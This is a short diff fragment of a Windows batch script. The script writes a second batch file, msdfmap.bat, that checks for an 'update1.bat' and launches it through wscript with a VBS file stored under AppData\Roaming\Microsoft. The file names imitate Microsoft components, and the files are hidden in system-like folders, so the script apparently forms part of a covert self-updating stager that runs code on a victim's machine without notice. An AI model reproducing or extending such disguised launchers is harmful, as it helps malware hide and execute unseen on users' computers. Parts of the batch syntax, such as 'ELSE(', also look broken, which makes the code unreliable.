@@ -154,9 +154,7 @@ ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
 REM if the update is downloaded its copied somewhere where this can check it update1 has been installed. May not be necessary.
 ECHO ping -n 10 127.0.0.1 >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO IF EXIST "C:\Users\Popeye\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
-ECHO    copy /y "C:\Users\%username%\Downloads\update1.bat" "C:\Users\%username%\AppData\Microsoft" >> C:\Users\%username%\Downloads\msdfmap.bat
-ECHO    ping -n 1 127.0.0.1 >> C:\Users\%username%\Downloads\msdfmap.bat
-ECHO    wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\Microsoft\update1.bat >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO    wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\Downloads\update1.bat >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ELSE( >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ECHO nothing >> C:\Users\%username%\Downloads\msdfmap.bat
